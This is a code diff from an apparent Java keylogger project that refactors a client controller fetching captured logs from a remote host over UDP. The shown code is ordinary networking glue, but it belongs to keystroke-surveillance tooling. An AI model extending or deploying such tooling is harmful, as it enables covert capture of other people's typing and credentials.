@@ -1,5 +1,6 @@
-package com.hao.keylogger.controllers;
+package com.hao.keylogger.controllers.Client;
 
+import java.net.InetAddress;
 import java.net.SocketException;
 import java.net.UnknownHostException;
 import java.util.ArrayList;
@@ -16,10 +17,9 @@ public class ClientLogController {
 	
 	UDPClientHelper udpClientHelper;
 
-	public ClientLogController(ClientView logView, Log log) {
+	public ClientLogController(ClientView logView) {
 		super();
 		this.logView = logView;
-		this.log = log;
 		this.logView.setController(this);
 	}
 
@@ -40,13 +40,14 @@ public class ClientLogController {
 	}
 
 	public void loadView() {
-		logView.setHost(log.getHost());
-		logView.setPort(log.getPort());
+		//logView.setHost(log.getHost());
+		//logView.setPort(log.getPort());
 		logView.setLogContent(log.getContent());
 	}
 
+	/*
 	public boolean connect() {
-		String hostName = logView.getHost();
+		InetAddress hostName = logView.getHost();
 		int port = logView.getPort();
 		try {
 			udpClientHelper = UDPClientHelper.getInstance(hostName, port);
@@ -59,10 +60,17 @@ public class ClientLogController {
 		}
 		return false;
 	}
+	*/
 	
 	public void fetchLog(Date date) throws NullPointerException {
-		log = udpClientHelper.fetchLog(date);
-		loadView();
+		try {
+			log = new UDPClientHelper(logView.getHostAddress(), logView.getPort()).fetchLog(date);
+			loadView();
+		} catch (SocketException | UnknownHostException e) {
+			// TODO xử lý fetch không được log
+			e.printStackTrace();
+		}
+		
 	}
 	
 	public void fetchAllLogs() {
